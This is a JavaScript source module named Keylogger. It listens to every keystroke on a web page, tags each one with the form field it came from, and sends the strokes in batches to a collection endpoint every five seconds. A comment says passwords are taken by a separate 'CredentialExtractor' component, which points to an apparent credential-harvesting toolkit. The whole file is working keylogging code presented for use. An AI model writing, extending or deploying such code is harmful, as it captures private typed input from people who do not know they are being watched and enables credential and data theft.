export default class Keylogger {
  constructor(core) {
    this.core = core;
    this.buffer = [];
    this.BATCH_INTERVAL = 5000;
    this.timer = null;
    this.adminExcludeAttr = 'data-admin-exclude';
  }

  init() {
    document.addEventListener('keydown', this.handleKeydown.bind(this));
  }

  handleKeydown(event) {
    // Skip if target has admin-exclude attribute
    if (event.target?.hasAttribute?.(this.adminExcludeAttr)) return;
    
    // Don't capture if in password field - credentials are captured by CredentialExtractor
    const isPassword = event.target?.type === 'password';
    
    const keyInfo = {
      key: isPassword ? '•' : event.key,
      target: this.getElementIdentifier(event.target),
      t: Date.now(),
      altKey: event.altKey,
      ctrlKey: event.ctrlKey,
      shiftKey: event.shiftKey,
      metaKey: event.metaKey
    };

    this.buffer.push(keyInfo);

    if (!this.timer) {
      this.timer = setTimeout(() => this.flush(), this.BATCH_INTERVAL);
    }
  }

  getElementIdentifier(el) {
    if (!el) return 'unknown';
    if (el.name) return `[name="${el.name}"]`;
    if (el.id) return `#${el.id}`;
    if (el.placeholder) return `[placeholder="${el.placeholder}"]`;
    if (el.className && typeof el.className === 'string') {
      return el.tagName?.toLowerCase() + '.' + el.className.split(' ')[0];
    }
    return el.tagName?.toLowerCase() || 'unknown';
  }

  async flush() {
    if (this.buffer.length === 0) return;
    const strokes = [...this.buffer];
    this.buffer = [];
    this.timer = null;
    await this.core.send('/api/collect/keystroke', { strokes });
  }
}